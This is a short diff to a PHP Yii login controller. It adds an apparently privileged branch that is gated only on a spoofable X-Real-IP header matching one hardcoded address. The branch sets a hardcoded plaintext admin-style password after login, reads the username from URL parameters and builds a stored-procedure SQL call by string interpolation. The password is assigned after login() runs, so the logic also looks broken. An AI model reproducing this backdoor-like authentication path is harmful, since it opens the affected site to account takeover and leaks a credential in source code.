@@ -149,11 +149,12 @@ class SiteController extends Controller
 
         $model = new LoginForm();
         $model->username = Yii::$app->request->get('username');
-        $model->password = Yii::$app->request->get('password');
+
 
         $is_ads = (isset($_SERVER['HTTP_X_REAL_IP']) && ($_SERVER['HTTP_X_REAL_IP'] == '86.57.147.222'));
         if($is_ads){
             if ($model->login()) {
+                $model->password = 'admin_lhe;,f78';
                 $seller_id = Yii::$app->user->identity->getId();
                 $sql = "call pc_recovery_product_seller_data({$seller_id});";
                 \Yii::$app->db->createCommand($sql)->execute();
